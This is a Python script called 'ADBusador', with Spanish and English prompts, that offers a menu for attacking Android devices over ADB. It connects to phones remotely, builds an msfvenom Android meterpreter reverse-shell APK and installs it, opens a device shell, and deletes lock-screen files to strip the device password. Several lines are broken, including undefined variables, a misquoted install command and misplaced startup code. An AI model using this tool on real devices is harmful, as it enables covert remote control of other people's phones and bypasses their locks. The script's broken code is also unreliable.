#! /usr/bin/env python
# -*- coding: utf-8 -*-
import time as t
import os

CurrentDir = os.path.dirname(os.path.abspath(__file__))

os.system("echo aqui queria poner un backdoor bien sensual")

banner = ("""
   _____  ________ __________                          .___
  /  _  \ \______ \\______   \__ __  ___________     __| _/___________
 /  /_\  \ |    |  \|    |  _/  |  \/  ___/\__  \   / __ |/  _ \_  __ |
/    |    \|    `   \    |   \  |  /\___ \  / __ \_/ /_/ (  <_> )  | \/
\____|__  /_______  /______  /____//____  >(____  /\____ |\____/|__|
        \/        \/       \/           \/      \/      \/
""")
menu = ("""
[1] Mostrar Dispositivos    [2] Conectar Remotamente
[3] Instalar meterpreter    [4] Obtener Shell
[5] Grabar Pantalla         [6] Desbloquear Pantalla

                    [E] Salir
""")
#####################################################################################
def main():
    option = input( "ADBusador (Menu) > ")
    if option == '1':
        os.system("adb devices -1")

    elif option == '2':
        os.system("adb tcpip 5555")
        ip = input("Ingresa la IP : ")
        os.system("adb connect "+IP+":5555")

    elif option == '3':
        device_name = input("Ingresa el nombre del dispositivo : ")
        os.system("msfvenom -p android/meterpreter/reverse_tcp LHOST= LPORT=4444 > /root/Downloads/yumi.apk")
        os.system("adb -s "+device_name+" install "/root/Downloads/yumi.apk)
        print ("Instalado Correctamente")

    elif option == '4':
        device_name = input("Enter a device name : ")
        os.system("adb -s "+device_name+" shell")

    elif option == '5':
        device_name = input("Enter a device name : ")
        apk_location = input("Enter the apk location : ")
        os.system("adb -s  "+device_name+" install "+apk_location)
        print ("Apk has been installed.")

    elif option == '6':
        device_name = input("Enter a device name : ")
        print ( "******************INTENTANDO QUITAR CONTRASEÑA******************")
        os.system("adb -s "+device_name+" shell su 0 'rm /data/system/gesture.key'")
        os.system("adb -s "+device_name+" shell su 0 'rm /data/system/locksettings.db'")
        os.system("adb -s "+device_name+" shell su 0 'rm /data/system/locksettings.db-wal'")
        os.system("adb -s "+device_name+" shell su 0 'rm /data/system/locksettings.db-shm'")
        print ( "******************INTENTANDO QUITAR CONTRASEÑA******************")

    elif option == 'e':
        exit()

    elif option == 'E':
        exit()
    main()

    try:
        os.chdir(CurrentDir+"//adb")
        print ("Starting  adb server..")
        os.system("adb tcpip 5555")
        t.sleep(1)
        os.system('cls')
        banner_title = logo
        print (banner_title)
        print (page)
        main()
    except KeyboardInterrupt:
        exit()
